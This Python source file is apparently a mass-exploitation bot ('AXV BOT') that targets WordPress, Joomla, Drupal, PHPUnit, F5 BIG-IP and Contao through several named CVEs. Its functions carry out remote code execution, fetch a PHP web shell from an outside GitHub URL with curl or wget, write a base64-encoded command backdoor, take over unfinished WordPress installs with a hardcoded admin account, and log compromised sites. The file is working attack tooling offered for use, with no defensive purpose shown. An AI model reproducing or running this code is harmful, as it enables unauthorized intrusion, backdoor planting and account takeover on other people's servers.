from requests import post, session, put
import codecs
import sys
import re, base64
import urllib.request
from random import choice
from string import ascii_letters
import json
from random import sample as rand
import urllib.parse
from fake_useragent import UserAgent
import os, time
from json import loads, dumps
from colorama import Fore, init
from rich import print as cetak
from pystyle import Colors,Colorate,Write
from rich.panel import Panel as nel
import requests,urllib3
from multiprocessing.dummy import Pool, Lock, Semaphore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
init(autoreset=True)
from datetime import datetime
from time import time as timer
red = Fore.RED 
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE
ua = {'User-Agent': UserAgent().random}
phpjpg = "modules/0KemYggJIdGfpf5i42FN/shells/axv2.php.jpg"
zipp = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.zip'
def gui():
    Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
    text = f""" 
 █████╗ ██╗  ██╗██╗   ██╗    ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗██╔╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝
███████║ ╚███╔╝ ██║   ██║    ██████╔╝██║   ██║   ██║   
██╔══██║ ██╔██╗ ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║   
██║  ██║██╔╝ ██╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝  

# CREATED BY : t.me/AXVDIGITAL
# TOOLS NAME : PRIVATE MASS EXPLOITER + AUTO UPLOAD BYPASS SHELLS
# LAST UPDATED : 19-05-2024
# WORDPRESS : 50+ EXPLOITS
# JOOMLA : 30+ EXPLOITS
# PRETASHOP : 15+ EXPLOITS
# OTHER : 20+ EXPLOITS
# TOOLS VERSION : 10"""

    for N, line in enumerate(text.split("\n")):
        print(Colorate.Horizontal(Colors.red_to_green, line, 1))
        time.sleep(0.05)
    Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n\n", Colors.blue_to_purple, interval=0.01)
def clear():
    if sys.platform.startswith('linux'):
        os.system('clear')
    elif sys.platform.startswith('freebsd'):
        os.system('clear')
    else:
        os.system('cls')
class PHPFilterChainGenerator:
    def __init__(self):
        self.conversions = {
            "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
            "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
            "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
            "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
            "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
            "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
            "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
            "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
            "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
            "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
            "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
            "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
            "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
            "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
            "C": "convert.iconv.UTF8.CSISO2022KR",
            "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
            "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
            "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
            "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
            "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
            "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
            "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
            "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
            "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
            "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
            "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
            "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
            "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
            "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
            "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
            "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
            "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
            "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
            "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
            "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
            "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
            "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
            "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
            "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
            "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
            "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
            "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
            "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
            "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
            "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
            "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
            "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
            "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
            "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
            "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
            "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
            "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
            "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
            "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
            "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
            "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
            "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
            "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
            "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
            "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
            "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
            "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
            "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
            "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
            "=": "",
        }

    def generate_filter_chain(self, chain):
        chain = chain.encode("utf-8")
        chain = base64.b64encode(chain).decode("utf-8").replace("=", "")
        encoded_chain = chain
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"

        for c in encoded_chain[::-1]:
            filters += self.conversions.get(c, "") + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"

        filters += "convert.base64-decode"
        final_payload = f"php://filter/{filters}/resource=php://temp"
        return final_payload
    
def php_str_noquotes(data):
    try:
        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format(ord(char))
        return encoded[:-1]
    except:
        pass
    
def generate_payload(php_payload):
    try:
        php_payload = "eval({0})".format(php_str_noquotes(php_payload))
        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
        return exploit_template
    except:
        pass

def rce_url(url, user_agent):
    try:
        headers = {
            'User-Agent': UserAgent().random,
            'x-forwarded-for': user_agent
        }
        cookies = requests.get(url, headers=headers, timeout=30).cookies
        for _ in range(3):
            response = requests.get(url, headers=headers, cookies=cookies, timeout=30)
        return response
    except:
        pass

# Shells


# try:
#     with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
#         ooo = f.read().splitlines()
# except IOError:
#     pass
# ooo = list((ooo))

# WSoShell = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'r').read()
SHELL_URL = 'https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'
def get_nonce(host_data : str):
    search = r'var WprConfig = {"ajaxurl":"[^"]*","resturl":"[^"]*","nonce":"([^"]+)"'
    match = re.search(search, host_data)
    nonce_value = match.group(1)

    return nonce_value


def perlExploit(domain):
    try:
        ua = {'User-Agent': UserAgent().random}
        string_to_write = f"<?=`$_POST[ova]`?>"
        generator = PHPFilterChainGenerator()
        hex_escaped_char = generator.generate_filter_chain(string_to_write)
        hd = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': UserAgent().random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'referer': 'www.google.com'
            }

        hdo = {'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': UserAgent().random,
                'Accept': '*/*',
                'content-dir': hex_escaped_char }
        
        shells = "https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axvuploader.php"
        url = f"https://{domain}/wp-content/plugins/backup-backup/includes/backup-heart.php"
        rova = requests.post(url, headers=hdo, verify=False, timeout=20)
        exploit = {"ova":'wget ' + shells + ' ' + ' -O' + "AXVShells.php"}
        requests.post(url, headers=hdo,data=exploit, verify=False, timeout=20)
        if rova.status_code == 200:
            rrova = requests.get(f'http://{domain}/wp-content/plugins/backup-backup/includes/AXVShells.php', headers=hd, verify=False, timeout=20)
            fg = Fore.GREEN
            if 'AXVTECH' in rrova.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Perl -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"http://{domain}/wp-content/plugins/backup-backup/includes/AXVShells.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Perl -->> {red}Failed Exploit!")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Perl -->> {red}Not Vuln !")
    except:pass


def phpUnitExploit(domain, vulnUrl, cve):
    try:
        domain = ''.join(domain)
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        ua = {'User-Agent': UserAgent().random}
        payload = vulnUrl
        PostData1 = '<?php system("curl -O https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php"); system("mv axv.php up.php"); ?>'
        PostData2 = '<?php system("wget https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php -O up2.php"); ?>'
        PostData3 = '<?php fwrite(fopen("up3.php","w+"),file_get_contents("https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php")); ?>'
        vulnurl = domain + payload
        shell1 = str(vulnurl).replace('eval-stdin.php', 'up.php')
        shell2 = str(vulnurl).replace('eval-stdin.php', 'up2.php')
        shell3 = str(vulnurl).replace('eval-stdin.php', 'up3.php')
        session = requests.session()
        session.get('http://' + vulnurl, data=PostData1, headers=ua, timeout=20, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData2, headers=ua, timeout=20, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData3, headers=ua, timeout=20, verify=False, allow_redirects=False)
        CheckShell1 = requests.get('http://' + shell1, headers=ua, timeout=10, verify=False)
        CheckShell2 = requests.get('http://' + shell2, headers=ua, timeout=10, verify=False)
        CheckShell3 = requests.get('http://' + shell3, headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in CheckShell1.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}{cve} -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"http://{shell1}\n")
        if 'AXVTECH' in CheckShell2.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}{cve} -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"http://{shell2}\n")
        if 'AXVTECH' in CheckShell3.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}{cve} -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"http://{shell3}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}{cve} -->> {red}Not Vuln !")
    except:pass


def drupal7_1(domain):
    try:
            domain = ''.join(domain)
            domain = domain.strip()
            domain = re.sub(r'https?://', '', domain)
            ua = {'User-Agent': UserAgent().random}
            kentot = (f'https://{domain}/?q=user/password&name[%23post_render][]=system&name[%23markup]=echo "axvtech"&name[%23type]=markup')
            data = {
            'form_id':'user_pass',
            '_triggering_element_name':'name'
            }
            r = requests.post(kentot,data=data,verify=False,timeout=30, headers=ua)
            result = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
            if result:
                found = result.group(1)
                url2= f'http://{domain}?q=file/ajax/name/%23value/'+found
                data = {'form_build_id' : found}
                requests.post(url2,data=data,verify=False,timeout=30, headers=ua).text
                kentot2 = (f'http://{domain}/?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php > /sites/default/files/axv.php&name[%23type]=markup')
                data6 = {
                    'form_id':'user_pass',
                    '_triggering_element_name':'name'
                }
                re2 = requests.post(kentot2,data=data6,verify=False,timeout=30, headers=ua)
                result2 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re2.text)
                if result2:
                    found3  = result2.group(1)
                    url23 = f'https://{domain}?q=file/ajax/name/%23value/'+found3
                    data1 = {'form_build_id' : found3}
                    requests.post(url23, data=data1,verify=False,timeout=30, headers=ua)
                    cek = requests.get(f'http://{domain}/sites/default/files/axv.php',verify=False,timeout=10, headers=ua).text
                else:
                    pass
                kentot3 = (f'https://{domain}/?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php -o hjkk.php&name[%23type]=markup')
                data7 = {
                    'form_id':'user_pass',
                    '_triggering_element_name':'name'
                }
                re3 = requests.post(kentot3,data=data7,verify=False,timeout=30, headers=ua)
                result3 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re3.text)
                if result3:
                    found4  = result3.group(1)
                    url234 = f'https://{domain}/?q=file/ajax/name/%23value/'+found4
                    data2 = {'form_build_id' : found4}
                    requests.post(url234, data=data2,verify=False,timeout=30, headers=ua)
                    cek1 = requests.get(f'http://{domain}/hjkk.php',verify=False,timeout=10, headers=ua).text
                else:
                    pass

                if 'axvtech' in r.text:
                    if 'AXVTECH' in cek:
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal7 -->> {green}Exploited !")
                        open('results/ShellsExploit.txt', 'a+').write(f'http://{domain}/sites/default/files/axv.php'+'\n')
                    else:
                        if 'AXVTECH' in cek1:
                            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal7 -->> {green}Exploited !")
                            open('results/ShellsExploit.txt', 'a+').write(f'http://{domain}/hjkk.php'+'\n')
                        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal7 -->> {red}Failed !")
                else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal7 -->> {red}Failed !")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Drupal7 -->> {red}Not Vuln !")
    except:pass

def wpInstall(domain):
    try:
        domain = ''.join(domain)
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        ua = {'User-Agent': UserAgent().random}
        install = requests.get(f'http://{domain}/wp-admin/install.php?step=2', verify=False, headers=ua, allow_redirects=False, timeout=30)
        if 'admin_password2' in install.text or 'weblog_title' in install.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp Install -->> {green}Vuln !")
            open('results/Vuln_WpInstall.txt', 'a+').write(f'http://{domain}/wp-admin/install.php?step=2'+'\n')
            requests.post('http://' + domain +"/wp-admin/install.php?step=2", data = {'weblog_title':'AXVTECH','user_name':'axvtech','admin_password':'axvtEcH123','admin_password2':'axvtEcH123','admin_email':'admin@axvtech.id','language':'','Submit':'Install+WordPress'}, timeout=25, headers=ua)
            op = urllib.request.urlopen(f'http://{domain}/wp-login.php', timeout=25)
            if 'AXVTECH' in op.read():
                 print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp Install -->> {green}Exploited !")
                 open('results/OK_WpInstall.txt', 'a+').write(f'http://{domain}/wp-login.php#axvtech@axvtEcH123'+'\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp Install -->> {red}Failed Exploit!")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp Install -->> {red}Not Vuln !")
        

    except:pass

def Exploit_CVE_2022_1388(domain):
    try:
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        ua = {'User-Agent': UserAgent().random}
        p_url = 'https://' + domain + '/mgmt/tm/util/bash'
        p_header = {
        'Content-Type': 'application/json',
        'Connection': 'X-F5-Auth-Token',
        'X-F5-Auth-Token': 'CVE-2022-1388 Exploit TEST',
        'Authorization': 'Basic YWRtaW46dmFlbHdvbGY='
        }
        p_data = {
            'command': 'run',
            'utilCmdArgs': '-c "echo CVE_2022_1388Vuln"'
        }

        p_data2 = {
            'command': 'run',
            'utilCmdArgs': '-c "wget \'https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php\' -O axv281.php"'
        }
        p_data3 = {
            'command': 'run',
            'utilCmdArgs': '-c "echo \'AXVTECH SHELLS!!!<?php eval(base64_decode(\'c3lzdGVtKCRfR0VUWyJjbWQiXSk7\')); ?>\' > shellAxv.php"'
        }
        p_data4 = {
            'command': 'run',
            'utilCmdArgs': '-c "curl -O https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php"'
        }
        r = requests.post(p_url, headers=p_header, json=p_data, timeout=7, verify=False)
        if r.json()['commandResult']:
            if 'CVE_2022_1388Vuln' in r.json()['commandResult']:
                requests.post(p_url, headers=p_header, json=p_data2, timeout=20, verify=False)
                requests.post(p_url, headers=p_header, json=p_data3, timeout=20, verify=False)
                requests.post(p_url, headers=p_header, json=p_data4, timeout=20, verify=False)
                checksh1 = requests.get('http://' + domain + '/mgmt/tm/util/axv281.php', headers=ua, verify=False, timeout=6).text
                checksh2 = requests.get('http://' + domain + '/mgmt/tm/util/shellAxv.php', headers=ua, verify=False, timeout=6).text
                checksh3 = requests.get('http://' + domain + '/mgmt/tm/util/axv.php', headers=ua, verify=False, timeout=6).text
                if 'AXVTECH' in checksh1:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-1388 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/axv281.php\n")
                elif 'AXVTECH' in checksh2:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-1388 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/shellAxv.php\n")
                elif 'AXVTECH' in checksh3:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-1388 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/axv.php\n")
                else:pass
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-1388 -->> {red}Failed Exploit!")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-1388 -->> {red}Not Vuln!")
    except:pass

def CVE_2022_26256(domain):
    try:
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        ua = {'User-Agent': UserAgent().random}
        header = {
            'User-Agent': UserAgent().random,
            'Content-Type': 'application/json;charset=utf-8',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Requested-With': 'XMLHttpRequest',
            'X-HTTP-Method-Override': 'PUT',
            'Origin': 'http://' + domain,
            'Cookie': 'Cookie: contao_manager_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDU2Mjk1MzgsImV4cCI6MTY0NTYzMTMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.lQCiIXKENysw7omSrUFr1poKfwSf9W0UyAztlXEMIvs'
        }
        parm = {
            'php_cli': 'echo CVE_2022_26256Vuln',
            'cloud': False
        }
        parm1 = {
            'php_cli': 'wget "https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php" -O up2.php',
            'cloud': False
        }
        parm2 = {
            'php_cli': "echo \'AXVTECH SHELLS!!!<?php eval(base64_decode(\'c3lzdGVtKCRfR0VUWyJjbWQiXSk7\')); ?>\' > shellAxv.php",
            'cloud': False
        }
        parm3 = {
            'php_cli': 'curl -O https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php',
            'cloud': False
        }
        try:
            res = requests.post('https://' + domain + '/api/server/config', headers=header, json=parm, timeout=10, verify=False).text
            if 'CVE_2022_26256Vuln' in res:
                requests.post('https://' + domain + '/api/server/config', headers=header, json=parm1, timeout=10, verify=False)
                requests.post('https://' + domain + '/api/server/config', headers=header, json=parm2, timeout=10, verify=False)
                requests.post('https://' + domain + '/api/server/config', headers=header, json=parm3, timeout=10, verify=False)
                checksh1 = requests.get('http://' + domain + '/api/server/shellAxv.php', timeout=6, headers=ua, verify=False).text
                checksh2 = requests.get('http://' + domain + '/api/server/up2.php', timeout=6, headers=ua, verify=False).text
                checksh3 = requests.get('http://' + domain + '/api/server/axv.php', timeout=6, headers=ua, verify=False).text
                if 'AXVTECH' in checksh1:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE_2022_26256 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/axv281.php\n")
                elif 'AXVTECH' in checksh2:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE_2022_26256 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/shellAxv.php\n")
                elif 'AXVTECH' in checksh3:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE_2022_26256 -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/mgmt/tm/util/axv.php\n")
                else:pass
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE_2022_26256 -->> {red}Not Vuln!")
        except:pass
    except:pass
###################
def random_char(y):
    return ''.join(choice(ascii_letters) for x in range(y))


def register(url, username, password):
    url = url.strip()
    url = re.sub(r'https?://', '', url)
    headerx = {
        "Content-Type": "application/json; charset=UTF-8"
    }
    data = {
        "user_login": username,
        "user_email": random_char(7) + "@test.com",
        "user_name": username,
        "password": password
    }
    try:
        r = post('http://' + url + "/wp-json/buddypress/v1/signup", headers=headerx, data=dumps(data))
        if r.status_code == 500:
            Wp_login(url, username, password)
        elif r.status_code == 404:
           print(f"{blue}|- {white}http://{url} {white}| {yellow}CVE-2021-21389 -->> {red}Not Vuln!")
        else:
            data = loads(r.text)
            activation_key = data[0]["activation_key"]
            put('http://' + url + "/wp-json/buddypress/v1/signup/activate/" + activation_key)
            Wp_login(url, username, password)
    except:
       print(f"{blue}|- {white}http://{url} {white}| {yellow}CVE-2021-21389 -->> {red}Not Vuln!")



def Wp_login(domain, username, password):
    domain = domain.strip()
    domain = re.sub(r'https?://', '', domain)
    Wp_session = session()
    Origin = domain
    try:
        Origin = domain.split('/')[0]
    except:
        pass
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': f'http://{domain}/wp-admin/',
        'testcookie': '1'
    }
    pH = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://' + Origin,
        'Host': Origin,
        'Referer': 'http://' + Origin + '/wp-login.php',
        'User-Agent': UserAgent().random
    }
    url = 'http://' + domain + '/wp-login.php'
    try:
        ag = {'User-Agent': UserAgent().random}
        Wp_session.get('http://' + domain + '/wp-login.php', timeout=5, headers=ag)
        X = Wp_session.post(url, data=data, headers=pH, timeout=5, allow_redirects=False)
        if 'id="login_error' in X.text:
            print(' {} NOT Vulnerable!'.format(url))
        elif 'wordpress_logged_in' in str(X.cookies):
            open('Registered_WP.txt', 'a').write(f'http://{url}/wp-login.php|{username}|{password}\n')
            print(f"{blue}|- {white}http://{url} {white}| {yellow}CVE-2021-21389 -->> {green}Exploited !")
            return Wp_session
        else:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2021-21389 -->> {red}Not Vuln!")
    except:
        print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2021-21389 -->> {red}Not Vuln!")

def createNewgroup(url, s, username):
    try:
        url = url.strip()
        url = re.sub(r'https?://', '', url)
        response = s.get('http://' + url + "/groups/create/step/group-details/")
        _wp_nonce = re.findall(r'name="_wpnonce" value="(\w+)"', response.text)[0]
        group_name = "vuln" + username
        files = {
            'group-name': (None, group_name),
            'group-desc': (None, group_name),
            '_wpnonce': (None, _wp_nonce),
            'group-id': (None, '0'),
